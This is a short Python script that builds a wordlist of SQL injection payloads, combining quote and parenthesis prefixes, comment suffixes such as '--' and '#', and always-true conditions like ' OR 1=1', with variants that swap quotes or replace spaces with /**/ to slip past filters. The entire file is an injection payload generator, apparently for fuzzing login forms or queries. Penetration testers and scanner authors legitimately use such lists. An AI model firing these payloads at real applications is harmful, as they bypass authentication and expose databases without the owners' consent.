prefixes = [
    '',
    '"',
    '")',
    '"))',
    '")))',
]

suffixes = [
    '',
    '--',
    ' -- ',
    '#',
    '/*'
]

templates = [
    ' OR ""-"{no_suffix}',
    ' OR "" "{no_suffix}',
    ' OR ""&"{no_suffix}',
    ' OR ""^"{no_suffix}',
    ' OR ""*"{no_suffix}',
    ' OR "1"="1{no_suffix}',
    ' OR ("1"="1{no_suffix}',
    ' OR (("1"="1{no_suffix}',
    ' OR ((("1"="1{no_suffix}',
    ' OR ("1")=("1{no_suffix}',
    ' OR (("1"))=(("1{no_suffix}',
    ' OR ((("1")))=((("1{no_suffix}',
    ' OR 1=1',
    ' OR "1"="1"',
    ' OR true',
]


def generate():
    wordlist = []

    for prefix in prefixes:
        for suffix in suffixes:
            for template in templates:
                word = prefix + template
                
                if not '{no_suffix}' in word:
                    word += suffix
                else:
                    word = word.replace('{no_suffix}', '')

                wordlist.append(word)
                wordlist.append(word.replace(' ', '/**/'))

                word = word.replace('"', '\'')
                wordlist.append(word)
                wordlist.append(word.replace(' ', '/**/'))
    
    wordlist = list(set(wordlist))
    return wordlist
